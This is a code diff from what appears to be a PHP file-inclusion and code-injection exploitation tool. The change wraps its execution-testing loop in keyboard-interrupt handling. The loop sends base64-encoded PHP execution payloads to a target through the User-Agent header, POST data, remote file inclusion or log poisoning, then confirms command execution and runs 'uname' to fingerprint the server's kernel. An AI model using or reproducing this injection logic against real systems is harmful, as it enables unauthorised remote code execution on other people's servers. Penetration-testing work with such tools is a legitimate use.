@@ -110,33 +110,36 @@ class codeinjector(baseClass):
             self._log("PHP Injection works! Testing if execution works...", self.LOG_ALWAYS)
             php_inject_works = True
             for item in settings["php_exec"]:
-                name, payload = item
-                self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
-                testload = payload.replace("__PAYLOAD__", base64.b64encode(settings["shell_test"][0]))
-                if (mode.find("A") != -1):
-                    self.setUserAgent(testload)
-                    code = self.doGetRequest(url)
-                elif (mode.find("P") != -1):
-                    code = self.doPostRequest(url, testload)
-                elif (mode.find("R") != -1):
-                    code = self.executeRFI(url, suffix, testload)
-                elif (mode.find("L") != -1):
-                    testload = self.convertUserloadToLogInjection(testload)
-                    code = self.doPostRequest(url, testload)
-                if code != None and code.find(settings["shell_test"][1]) != -1:
-                    sys_inject_works = True
-                    working_shell = item
-                    self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
-                    if (kernel == None):
-                        self._log("Requesting kernel version...", self.LOG_DEBUG)
-                        uname_cmd = payload.replace("__PAYLOAD__", base64.b64encode("uname -r -s"))
-                        kernel = self.__doHaxRequest(url, mode, uname_cmd, suffix).strip()
-                        self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
-                        domain.setAttribute("kernel", kernel)
-                        self.saveXML()
+                try:
+                    name, payload = item
+                    self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
+                    testload = payload.replace("__PAYLOAD__", base64.b64encode(settings["shell_test"][0]))
+                    if (mode.find("A") != -1):
+                        self.setUserAgent(testload)
+                        code = self.doGetRequest(url)
+                    elif (mode.find("P") != -1):
+                        code = self.doPostRequest(url, testload)
+                    elif (mode.find("R") != -1):
+                        code = self.executeRFI(url, suffix, testload)
+                    elif (mode.find("L") != -1):
+                        testload = self.convertUserloadToLogInjection(testload)
+                        code = self.doPostRequest(url, testload)
+                    if code != None and code.find(settings["shell_test"][1]) != -1:
+                        sys_inject_works = True
+                        working_shell = item
+                        self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
+                        if (kernel == None):
+                            self._log("Requesting kernel version...", self.LOG_DEBUG)
+                            uname_cmd = payload.replace("__PAYLOAD__", base64.b64encode("uname -r -s"))
+                            kernel = self.__doHaxRequest(url, mode, uname_cmd, suffix).strip()
+                            self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
+                            domain.setAttribute("kernel", kernel)
+                            self.saveXML()
 
-                    break
-
+                        break
+                except KeyboardInterrupt:
+                    self._log("Aborted by user.", self.LOG_WARN)
+                    
             attack = None
             while (attack != "q"):
                 attack = self.chooseAttackMode(php=php_inject_works, syst=sys_inject_works)
